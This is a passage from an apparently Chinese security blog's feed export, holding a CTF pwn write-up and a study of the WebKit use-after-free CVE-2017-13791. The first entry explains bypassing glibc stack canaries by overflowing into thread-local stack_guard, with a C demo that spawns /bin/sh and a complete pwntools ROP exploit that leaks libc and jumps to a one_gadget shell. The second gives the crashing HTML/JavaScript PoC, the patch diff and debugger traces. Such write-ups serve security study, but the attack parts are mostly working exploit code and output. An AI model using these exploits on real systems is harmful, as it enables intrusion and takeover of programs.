Storage）是一种机制，通过该机制分配变量，以便每一个现存的线程都有一个变量实例。<br>它主要是为了避免多个线程同时访存同一全局变量或者静态变量时所导致的冲突，尤其是多个线程同时需要修改这一变量时。为了解决这个问题，我们可以通过TLS机制，为每一个使用该全局变量的线程都提供一个变量值的副本，每一个线程均可以独立地改变自己的副本，而不会和其它线程的副本冲突。从线程的角度看，就好像每一个线程都完全拥有该变量。而从全局变量的角度上来看，就好像一个全局变量被克隆成了多份副本，而每一份副本都可以被一个线程独立地改变。</p><p>这个机制在不同的架构和操作系统上的实现不同，本例实现在x86-64，glibc。<br>在本例中,mmap也被用来创建线程，这意味着如果TLS接近vulnerable object，它可能会被修改。<br>有趣的是，在glibc实现中，TLS被指向一个segment register fs(x86-64上)，它的结构tcbhead_t定义如下：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="keyword">void</span> *tcb;        <span class="comment">/* Pointer to the TCB.  Not necessarily the</span></span><br><span class="line"><span class="comment">               thread descriptor used by libpthread.  */</span></span><br><span class="line">  <span class="keyword">dtv_t</span> *dtv;</span><br><span class="line">  <span class="keyword">void</span> *self;       <span class="comment">/* Pointer to the thread descriptor.  */</span></span><br><span class="line">  <span class="keyword">int</span> multiple_threads;</span><br><span class="line">  <span class="keyword">int</span> gscope_flag;</span><br><span class="line">  <span class="keyword">uintptr_t</span> sysinfo;</span><br><span class="line">  <span class="keyword">uintptr_t</span> stack_guard;</span><br><span class="line">  <span class="keyword">uintptr_t</span> pointer_guard;</span><br><span class="line">  ...</span><br><span class="line">&#125; <span class="keyword">tcbhead_t</span>;</span><br></pre></td></tr></table></figure></p><p>它包括了stack_guard，即被称作canary的随机数，用来防止栈溢出。<br>它的工作模式是：当一个函数被调用，canary从tcbhead_t.stack_guard被放到栈上。在函数调用结束的时候，栈上的值被和tcbhead_t.stack_guard比较，如果两个值是不相等的，程序将会返回error并且终止。<br>研究表明，glibc在TLS实现上存在问题，线程在pthread_create的帮助下创建，然后需要给这个新线程选择TLS。<br>在为栈分配内存后，glibc在内存的高地址初始化TLS，在x86-64架构上，栈向下增长，将TLS放在栈顶部。<br>从TLS中减去一个特定的常量值，我们得到被新线程的stack register所使用的值。<br>从TLS到pthread_create的函数参数传递栈帧的距离小于一页。<br>现在攻击者将不需要得到leak canary的值，而是直接栈溢出足够多的数据来复写TLS中的tcbhead_t.stack_guard的值，从而bypass canary。<br>下面是一个例子。<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">pwn_payload</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> *argv[<span class="number">2</span>] = &#123;<span class="string">"/bin/sh"</span>, <span class="number">0</span>&#125;;</span><br><span class="line">    execve(argv[<span class="number">0</span>], argv, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> fixup = <span class="number">0</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> * <span class="title">first</span><span class="params">(<span class="keyword">void</span> *x)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"thread FS %p\n"</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie thread: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> * frame = __builtin_frame_address(<span class="number">0</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"stack_cookie addr %p \n"</span>, &amp;frame[<span class="number">-1</span>]);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"diff : %lx\n"</span>, (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]); </span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> len =(<span class="keyword">unsigned</span> <span class="keyword">long</span>)( (<span class="keyword">char</span>*)addr - (<span class="keyword">char</span>*)&amp;frame[<span class="number">-1</span>]) + </span><br><span class="line">fixup;</span><br><span class="line">    <span class="comment">// example of exploitation</span></span><br><span class="line">    <span class="comment">// prepare exploit</span></span><br><span class="line">    <span class="keyword">void</span> *exploit = <span class="built_in">malloc</span>(len);</span><br><span class="line">    <span class="built_in">memset</span>(exploit, <span class="number">0x41</span>, len);</span><br><span class="line">    <span class="keyword">void</span> *ptr = &amp;pwn_payload;</span><br><span class="line">    <span class="built_in">memcpy</span>((<span class="keyword">char</span>*)exploit + <span class="number">16</span>, &amp;ptr, <span class="number">8</span>);</span><br><span class="line">    <span class="comment">// exact stack-buffer overflow example</span></span><br><span class="line">    <span class="built_in">memcpy</span>(&amp;frame[<span class="number">-1</span>], exploit, len);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> **argv, <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> one;</span><br><span class="line">    <span class="keyword">unsigned</span> <span class="keyword">long</span> *addr;</span><br><span class="line">    <span class="keyword">void</span> *val;</span><br><span class="line">    arch_prctl(ARCH_GET_FS, &amp;addr);</span><br><span class="line">    <span class="keyword">if</span> (argc &gt; <span class="number">1</span>)</span><br><span class="line">        fixup = <span class="number">0x30</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"main FS %p\n"</span>, addr);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"cookie main: 0x%lx\n"</span>, addr[<span class="number">5</span>]);</span><br><span class="line">    pthread_create(&amp;one, <span class="literal">NULL</span>, &amp;first, <span class="number">0</span>);</span><br><span class="line">    pthread_join(one,&amp;val);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行结果。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">blackzert@...sher:~/aslur/tests$ ./thread_stack_tls  1</span><br><span class="line">main FS 0x7f4d94b75700</span><br><span class="line">cookie main: 0x2ad951d602d94100</span><br><span class="line">thread FS 0x7f4d94385700</span><br><span class="line">cookie thread: 0x2ad951d602d94100</span><br><span class="line">stack_cookie addr 0x7f4d94384f48</span><br><span class="line">diff : 7b8</span><br></pre></td></tr></table></figure></p><p>在当前栈帧和TCB结构之间的距离等于0x7b8,小于一页,只要溢出的字节够多，就可以把TCB中的tcbhead_t.stack_guard覆盖掉。</p><h2 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h2><p>先输入要输入的字节的数目，然后程序从终端读取输入内容，因为可输入的size最大0x10000，远大于栈的大小，栈溢出。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-164114.jpg" alt=""><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-164219.png" alt=""></p><h2 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h2><h3 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h3><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-164348.jpg" alt=""></p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>通过栈溢出构造rop，leak出libc的基地址，找到one_gadaget的偏移。<br>然后将这个地址读到bss段，然后leave&amp;&amp;ret，劫持rip到one_gadaget。</p><h3 id="确定padding"><a href="#确定padding" class="headerlink" title="确定padding"></a>确定padding</h3><p>s在rbp-0x1010，再加上old rbp即8个字节，到返回地址前一共是0x1018个字节。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-171603.png" alt=""></p><h3 id="leak-libc"><a href="#leak-libc" class="headerlink" title="leak libc"></a>leak libc</h3><p>当我们调用puts.plt的时候，系统会将真正的puts函数地址link到got表的puts.got中，然后puts.plt会根据puts.got跳转到真正的puts函数上去。<br>然后我们需要一个gadget(pop rdi;ret)来传递参数。</p><p>使用工具ROPgadget寻找<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">parallels@ubuntu:~/ctf/6ctf/babystack$ ROPgadget --binary bs --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">============================================================</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">Unique gadgets found: 12</span><br></pre></td></tr></table></figure></p><p>然后减去puts在libc里的偏移就是libc的基地址。</p><h3 id="one-gadget"><a href="#one-gadget" class="headerlink" title="one_gadget"></a>one_gadget</h3><p>直接用IDA搜索字符串/bin/sh，然后找到下面这种就是one_gadget，可以直接起shell。<br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-173344.png" alt=""><br>也可以使用工具<a href="https://github.com/david942j/one_gadget" target="_blank" rel="noopener">one_gadget</a><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install ruby</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-173642.png" alt=""></p><h3 id="调用read把one-gadget的地址读到bss段"><a href="#调用read把one-gadget的地址读到bss段" class="headerlink" title="调用read把one_gadget的地址读到bss段"></a>调用read把one_gadget的地址读到bss段</h3><p>之前我们已经找到了gadget用来传递read的参数。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000400c03 : pop rdi ; ret</span><br><span class="line">0x0000000000400c01 : pop rsi ; pop r15 ; ret</span><br></pre></td></tr></table></figure></p><p>调用read把one_gadget写到bss_addr。</p><p>通过leave先将rsp的值改为bss_addr，因为之前我们已经将one_gadget写到了bss_addr，然后通过ret，就可以劫持程序执行到one_gadget。</p><ul><li><p>leave：<br>在32位汇编下相当于:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mov esp,ebp                                        </span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure></li><li><p>ret<br>相当于</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pop rip</span><br></pre></td></tr></table></figure></li></ul><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>exp<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">libc = ELF(<span class="string">"./libc.so"</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">menu</span><span class="params">(bytes,data)</span>:</span></span><br><span class="line">    io.recvuntil(<span class="string">"How many bytes do you want to send?\n"</span>)</span><br><span class="line">    io.sendline(str(bytes))</span><br><span class="line">    sleep(<span class="number">0.1</span>)</span><br><span class="line">    io.send(data)</span><br><span class="line"></span><br><span class="line">puts_plt = <span class="number">0x4007C0</span></span><br><span class="line">read_plt = <span class="number">0x4007E0</span> </span><br><span class="line">leave_addr = <span class="number">0x400A9B</span></span><br><span class="line"></span><br><span class="line">pop_rdi_addr = <span class="number">0x400c03</span></span><br><span class="line">puts_got = <span class="number">0x601FB0</span></span><br><span class="line">pop_rbp_addr = <span class="number">0x400870</span></span><br><span class="line">pop_rsi_addr = <span class="number">0x400c01</span></span><br><span class="line"></span><br><span class="line">bss_addr = <span class="number">0x602030</span></span><br><span class="line"></span><br><span class="line">io = process(<span class="string">'./bs'</span>,env = &#123;<span class="string">"LD_PRELOAD"</span> : <span class="string">"./libc.so"</span>&#125;)</span><br><span class="line"><span class="comment"># context.log_level = 'debug'</span></span><br><span class="line">payload = <span class="string">'\x00'</span>*<span class="number">0x1010</span>+p64(bss_addr<span class="number">-0x8</span>)+p64(pop_rdi_addr) + p64(puts_got) + p64(puts_plt)</span><br><span class="line">payload += p64(pop_rdi_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_addr) + p64(bss_addr) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(read_plt) + p64(leave_addr)</span><br><span class="line">payload = payload.ljust(<span class="number">0x2000</span>,<span class="string">'\x00'</span>)</span><br><span class="line">menu(<span class="number">0x2000</span>,payload)</span><br><span class="line">io.recvuntil(<span class="string">'It\'s time to say goodbye.\n'</span>)</span><br><span class="line">base = u64(io.recv(<span class="number">6</span>)+<span class="string">'\x00\x00'</span>)-libc.symbols[<span class="string">'puts'</span>]</span><br><span class="line">io.send(p64(base+<span class="number">0xf1147</span>))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p><p><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-24-180654.png" alt=""></p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>要拿到flag，还要在服务器上绕过之前0ctf一样的waf，这个没什么好说的，爆破就行，这里只贴出本地getshell的代码。</p>]]></content>
      
      <categories>
          
          <category> CTF </category>
          
          <category> pwn </category>
          
          <category> 栈溢出 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> canary </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>webkit UAF:CVE-2017-13791学习</title>
      <link href="/2018/04/21/cve-2017-13791/"/>
      <url>/2018/04/21/cve-2017-13791/</url>
      <content type="html"><![CDATA[<h2 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h2><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">jsfuzzer</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    textarea1.setRangeText(<span class="string">"foo"</span>);</span><br><span class="line">    textarea2.autofocus = <span class="literal">true</span>;</span><br><span class="line">    textarea1.name = <span class="string">"foo"</span>;</span><br><span class="line">    form.insertBefore(textarea2, form.firstChild);</span><br><span class="line">    form.submit();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">eventhandler2</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">var</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++) &#123;</span><br><span class="line">      <span class="keyword">var</span> e = <span class="built_in">document</span>.createElement(<span class="string">"input"</span>);</span><br><span class="line">      form.appendChild(e);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br><span class="line"><span class="regexp">&lt;body onload=jsfuzzer()&gt;</span></span><br><span class="line"><span class="regexp">  &lt;form id="form" onchange="eventhandler2()"&gt;</span></span><br><span class="line"><span class="regexp">  &lt;textarea id="textarea1"&gt;a&lt;/</span>textarea&gt;</span><br><span class="line">  &lt;object id=<span class="string">"object"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">object</span>&gt;</span></span></span><br><span class="line">  &lt;textarea id=<span class="string">"textarea2"</span>&gt;b&lt;<span class="regexp">/textarea&gt;</span></span><br></pre></td></tr></table></figure><h2 id="patch"><a href="#patch" class="headerlink" title="patch"></a>patch</h2><p><a href="https://github.com/WebKit/webkit/commit/d0ac97f994f0145715402be4d4a24b54440beb02" target="_blank" rel="noopener">https://github.com/WebKit/webkit/commit/d0ac97f994f0145715402be4d4a24b54440beb02</a><br><img src="https://sakura-1252236262.cos.ap-beijing.myqcloud.com/2018-04-21-160334.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">-    &#123;</span><br><span class="line"> -        NoEventDispatchAssertion noEventDispatchAssertion;</span><br><span class="line"> -</span><br><span class="line"> -        for (auto&amp; control : form.associatedElements()) &#123;</span><br><span class="line"> -            auto&amp; element = control-&gt;asHTMLElement();</span><br><span class="line"> -            if (!element.isDisabledFormControl())</span><br><span class="line"> -                control-&gt;appendFormData(domFormData, isMultiPartForm);</span><br><span class="line"> -            if (is&lt;HTMLInputElement&gt;(element)) &#123;</span><br><span class="line"> -                auto&amp; input = downcast&lt;HTMLInputElement&gt;(element);</span><br><span class="line"> -                if (input.isTextField()) &#123;</span><br><span class="line"> -                    formValues.append(&#123; input.name().string(), input.value() &#125;);</span><br><span class="line"> -                    input.addSearchResult();</span><br><span class="line"> -                &#125;</span><br><span class="line"> -                if (input.isPasswordField() &amp;&amp; !input.value().isEmpty())</span><br><span class="line"> -                    containsPasswordData = true;</span><br><span class="line"> +    auto protectedAssociatedElements = form.associatedElements().map([] (FormAssociatedElement* rawElement) -&gt; Ref&lt;FormAssociatedElement&gt; &#123;</span><br><span class="line"> +        return *rawElement;</span><br><span class="line"> +    &#125;);</span><br><span class="line"> +</span><br><span class="line"> +    for (auto&amp; control : protectedAssociatedElements) &#123;</span><br><span class="line"> +        auto&amp; element = control-&gt;asHTMLElement();</span><br><span class="line"> +        if (!element.isDisabledFormControl())</span><br><span class="line"> +            control-&gt;appendFormData(domFormData, isMultiPartForm);</span><br><span class="line"> +        if (is&lt;HTMLInputElement&gt;(element)) &#123;</span><br><span class="line"> +            auto&amp; input = downcast&lt;HTMLInputElement&gt;(element);</span><br><span class="line"> +            if (input.isTextField()) &#123;</span><br><span class="line"> +                formValues.append(&#123; input.name(), input.value() &#125;);</span><br><span class="line"> +                input.addSearchResult();</span><br><span class="line">              &#125;</span><br><span class="line"> +            if (input.isPasswordField() &amp;&amp; !input.value().isEmpty())</span><br><span class="line"> +                containsPasswordData = true;</span><br><span class="line">          &#125;</span><br><span class="line">      &#125;</span><br></pre></td></tr></table></figure></p><p>在for (auto&amp; control : xxx)里，把form.associatedElements()改成了protectedAssociatedElements。<br>前者直接是使用HTMLFormElement中的m_associatedElements引用。<br><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> Vector&lt;FormAssociatedElement*&gt;&amp; associatedElements() <span class="keyword">const</span> &#123; <span class="keyword">return</span> m_associatedElements; &#125;</span><br><span class="line">Vector&lt;FormAssociatedElement*&gt; m_associatedElements;</span><br></pre></td></tr></table></figure></p><p>后者使用Ref<formassociatedelement>产生的引用来取代之前的m_associatedElements.</formassociatedelement></p><h2 id="poc分析"><a href="#poc分析" class="headerlink" title="poc分析"></a>poc分析</h2><h3 id="poc的一些知识点"><a href="#poc的一些知识点" class="headerlink" title="poc的一些知识点"></a>poc的一些知识点</h3><ol><li><code>&lt;body onload=jsfuzzer()&gt;</code><br>在页面加载完成后就调用jsfuzzer()函数。</li><li><p><code>textarea2.autofocus = true;</code><br>在jsfuzzer()里通过autofocus来改变了textarea2，从而因为onchange事件发生来回调了eventhandler2()函数。<br>这在webkit poc里很常见，都是这么写来触发的。<br>javascript是单线程的，回调就类似于内核里的trap，用来弥补不能多线程的缺陷。</p></li><li><p><code>eventhandler2</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">for(var i=0;i&lt;100;i++) &#123;</span><br><span class="line">      var e = document.createElement(&quot;input&quot;);</span><br><span class="line">      form.appendChild(e);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></li></ol><p>appendChild调用setForm，触发内存重新分配，set之后free。</p><ol><li><code>form.submit();</code><br>在submit里调用到了updateLayout。<br>在submit时需要保持页面布局是最新的. 导致有了一个时机通过回调事件访问目标对象.</li></ol><h3 id="UAF"><a href="#UAF" class="headerlink" title="UAF"></a>UAF</h3><h4 id="free"><a href="#free" class="headerlink" title="free"></a>free</h4><p>在 lldb 中确认. 可以看到 eventhandler2 中使用的 appendChild() 方法经过层层调用释放了 WebCore::FormAssociatedElement*</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">#0 0x103670044 in __sanitizer_mz_free (/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/clang/9.0.0/lib/darwin/libclang_rt.asan_osx_dynamic.dylib:x86_64h+0x5a044)</span><br><span class="line">#1 0x11465dbc0 in bmalloc::Deallocator::deallocateSlowCase(void*) (/Users/sakura/_release/webkit/WebKitBuild/Release/JavaScriptCore.framework/Versions/A/JavaScriptCore:x86_64+0x1ea2bc0)</span><br><span class="line">#2 0x10651b537 in WTF::Vector&lt;WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul&gt;::expandCapacity(unsigned long, WebCore::FormAssociatedElement**) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdf3537)</span><br><span class="line">#3 0x106517eff in void WTF::Vector&lt;WebCore::FormAssociatedElement*, 0ul, WTF::CrashOnOverflow, 16ul&gt;::insert&lt;WebCore::FormAssociatedElement*&amp;&gt;(unsigned long, WebCore::FormAssociatedElement*&amp;&amp;&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdefeff)</span><br><span class="line">#4 0x106517d6f in WebCore::HTMLFormElement::registerFormElement(WebCore::FormAssociatedElement*) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xdefd6f)</span><br><span class="line">#5 0x106276c98 in WebCore::FormAssociatedElement::setForm(WebCore::HTMLFormElement*) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4ec98)</span><br><span class="line">#6 0x1062775fe in WebCore::FormAssociatedElement::resetFormOwner() (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xb4f5fe)</span><br><span class="line">#7 0x10653719d in WebCore::HTMLInputElement::finishedInsertingSubtree() (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0xe0f19d)</span><br><span class="line">#8 0x105b12378 in WebCore::ContainerNode::notifyChildInserted(WebCore::Node&amp;, WebCore::ContainerNode::ChildChange const&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ea378)</span><br><span class="line">#9 0x105b11ecf in WebCore::ContainerNode::updateTreeAfterInsertion(WebCore::Node&amp;, WebCore::ContainerNode::ReplacedAllChildren) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3e9ecf)</span><br><span class="line">#10 0x105b11798 in WebCore::ContainerNode::appendChildWithoutPreInsertionValidityCheck(WebCore::Node&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3e9798)</span><br><span class="line">#11 0x105b14b54 in WebCore::ContainerNode::appendChild(WebCore::Node&amp;) (/Users/sakura/_release/webkit/WebKitBuild/Release/WebCore.framework/Versions/A/WebCore:x86_64+0x3ecb54)</span><br></pre></td></tr></table></figure><h4 id="use"><a href="#use" class="headerlink" title="use"></a>use</h4><p>前面我们说过了，在submit的时候，真正的触发页面的update</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(lldb) bt</span><br><span class="line">* thread #1, queue = &apos;com.apple.main-thread&apos;, stop reason = step in</span><br><span class="line">* frame #0: 0x0000000111ceb42f WebCore`WebCore::Document::updateLayout(this=0x00006200000210e0) at Document.cpp:1907</span><br><span class="line">frame #1: 0x0000000112e3f31c WebCore`WebCore::HTMLTextAreaElement::appendFormData(this=0x000061100042a1c0, encoding=0x000060400060d810, (null)=false) at HTMLTextAreaElement.cpp:225</span><br><span class="line">frame #2: 0x0000000112e3f54b WebCore`non-virtual thunk to WebCore::HTMLTextAreaElement::appendFormData(this=0x000061100042a1c0, encoding=0x000060400060d810, (null)=false) at HTMLTextAreaElement.cpp:0</span><br><span class="line">frame #3: 0x00000001126a34f8 WebCore`WebCore::FormSubmission::create(form=0x000061100042a080, attributes=0x000061100042a0e8, event=0x0000000000000000, lockHistory=Yes, trigger=SubmittedByJavaScript) at FormSubmission.cpp:200</span><br><span class="line">frame #4:......</span><br></pre></td></tr></table></figure><p>在for (auto&amp; control : form.associatedElements()) 执行的时候, use after free。</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>free和use的地点因为回调的缘故还是有点难找，我调试有点问题，这个洞暂时就这样了，不知道理解的对不对，看其他的时候加深理解吧。<br>参考的是我师傅之前写的文章（虽然现在删掉了）</p><p>主要学到的东西：<br>触发内存重新分配和真正的重新update，其实还是分离的，两者并不同时发生。<br>就像webkit里面页面里的一个元素被删除了，在cpp层不一定被释放掉了，不是同步的。<br>其实感觉webkit里UAF多的原因还是，程序中的对象调用关系过于复杂，实在难以搞清楚某个对象究竟是否已经释放了内存。<br>回调追着太复杂了。。还是easy，需要很多经验呀。</p>]]></content>
      
      <categories>
          
          <category> 浏览器 </category>
          
      </categories>
      
      
        <tags>
